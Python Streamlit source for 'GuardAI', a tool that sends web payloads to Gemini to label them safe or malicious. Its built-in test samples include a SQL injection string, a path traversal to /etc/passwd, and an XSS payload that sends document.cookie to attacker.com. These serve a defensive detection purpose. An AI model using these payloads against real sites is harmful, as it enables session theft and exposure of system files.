import json
import streamlit as st
from google import genai

# Page Configuration
st.set_page_config(
    page_title="GuardAI - Web Intrusion Detection", layout="wide"
)

st.title("GuardAI: Real-Time Web Intrusion Detection")
st.markdown(
    "Analyze web payloads and HTTP requests using **Gemini** to detect security"
    " vulnerabilities instantly."
)

# --- SIDEBAR CONFIGURATION ---
with st.sidebar:
  st.header("Configuration")

  # Check for stored secrets or allow manual input
  default_key = ""
  if (
      hasattr(st, "secrets")
      and "GEMINI_API_KEY" in st.secrets
      and st.secrets["GEMINI_API_KEY"]
  ):
    default_key = st.secrets["GEMINI_API_KEY"]

  api_key_input = st.text_input(
      "Gemini API Key",
      value=default_key,
      type="password",
      help="Paste your Google AI Studio API key here.",
  )

  st.markdown("---")
  st.markdown("Need an API Key?")
  st.markdown(
      "[Get a free key from Google AI"
      " Studio](https://aistudio.google.com/app/apikey)"
  )

  st.markdown("---")
  st.markdown("### Test Samples")
  sample_choice = st.selectbox(
      "Load Sample Payload:",
      [
          "Select a sample...",
          "SQL Injection (SQLi)",
          "Cross-Site Scripting (XSS)",
          "Path Traversal",
          "Clean Traffic (Safe)",
      ],
  )

# Sample payloads dictionary
samples = {
    "SQL Injection (SQLi)": "' OR '1'='1' --",
    "Cross-Site Scripting (XSS)": (
        "<script>fetch('http://attacker.com/steal?cookie=' +"
        " document.cookie)</script>"
    ),
    "Path Traversal": "../../../../etc/passwd",
    "Clean Traffic (Safe)": (
        "Hello, I would like to update my account email address to"
        " user@example.com"
    ),
}

# --- MAIN INTERFACE ---
col1, col2 = st.columns(2)

with col1:
  st.subheader("Live Traffic / Payload Inspector")

  # Populate text area if a sample is selected
  initial_text = (
      samples[sample_choice]
      if sample_choice != "Select a sample..."
      else ""
  )
  payload_text = st.text_area(
      "Enter HTTP request body, query string, or payload:",
      value=initial_text,
      height=180,
      placeholder="Type or paste payload here...",
  )

  analyze_btn = st.button("Analyze Payload", type="primary")

with col2:
  st.subheader("AI Security Suggestions")

  if analyze_btn:
    if not api_key_input.strip():
      st.warning(
          "API Key Missing: Please enter your Gemini API Key in the sidebar to"
          " begin analysis."
      )
    elif not payload_text.strip():
      st.warning(
          "Empty Payload: Please enter or select a payload string to inspect."
      )
    else:
      try:
        # Initialize client with user key
        client = genai.Client(api_key=api_key_input.strip())

        with st.spinner("Analyzing payload behavior with Gemini..."):
          system_instruction = (
              "You are an expert Web Application Firewall (WAF) and security"
              " analyst. Analyze the provided web request payload for"
              " vulnerabilities such as SQLi, XSS, Path Traversal, Command"
              " Injection, etc. You must return ONLY a valid JSON object with"
              ' the following exact keys: "status" (string: "SAFE" or'
              ' "MALICIOUS"), "risk_score" (integer 0-100), "threat_type"'
              ' (string: name of threat or "None"), "explanation" (string:'
              " why it is dangerous or safe), and "
              ' "remediation" (string: how to fix or prevent it).'
          )

          # Request generation with enforced JSON mime type
          response = client.models.generate_content(
              model="gemini-2.5-flash",
              contents=f"Payload to analyze: {payload_text}",
              config={
                  "system_instruction": system_instruction,
                  "response_mime_type": "application/json",
              },
          )

          raw_text = response.text.strip()

          # Clean markdown code blocks if any slip through
          if raw_text.startswith("```json"):
            raw_text = raw_text[7:]
          if raw_text.startswith("```"):
            raw_text = raw_text[3:]
          if raw_text.endswith("```"):
            raw_text = raw_text[:-3]

          # Robust JSON parsing with fallback protection
          try:
            result = json.loads(raw_text.strip())
          except json.JSONDecodeError:
            # Fallback structure if model output is imperfect text
            result = {
                "status": "MALICIOUS" if any(kw in payload_text.lower() for kw in ["script", "or", "..", "exec"]) else "SAFE",
                "risk_score": 70,
                "threat_type": "Suspicious Activity Pattern",
                "explanation": raw_text,
                "remediation": "Apply strict input sanitization and parameterized queries.",
            }

          status = result.get("status", "SAFE")
          risk_score = result.get("risk_score", 0)

          if status == "MALICIOUS":
            st.error(f"Threat Detected: {result.get('threat_type', 'Security Violation')}")
          else:
            st.success("Traffic is Clean / Safe")

          st.metric(label="Calculated Risk Score", value=f"{risk_score} / 100")

          st.markdown("### Analysis Breakdown")
          st.info(result.get("explanation", "No explanation generated."))

          st.markdown("### Remediation Guidance")
          st.code(result.get("remediation", "Review secure coding standards."), language="text")

      except Exception as e:
        error_msg = str(e)
        if "400" in error_msg or "API_KEY_INVALID" in error_msg:
          st.error(
              "Invalid API Key: The key provided in the sidebar is incorrect or"
              " expired. Please generate a fresh key from Google AI Studio."
          )
        elif "429" in error_msg or "RESOURCE_EXHAUSTED" in error_msg:
          st.error(
              "Rate Limit Exceeded: You have hit the API request quota limit."
              " Please wait a few seconds and try again."
          )
        else:
          st.error(
              f"Analysis Error: An unexpected error occurred. Details:"
              f" {error_msg}"
          )
  else:
    st.info(
        "Select a sample or type a payload on the left and click **Analyze"
        " Payload** to run diagnostics."
    )
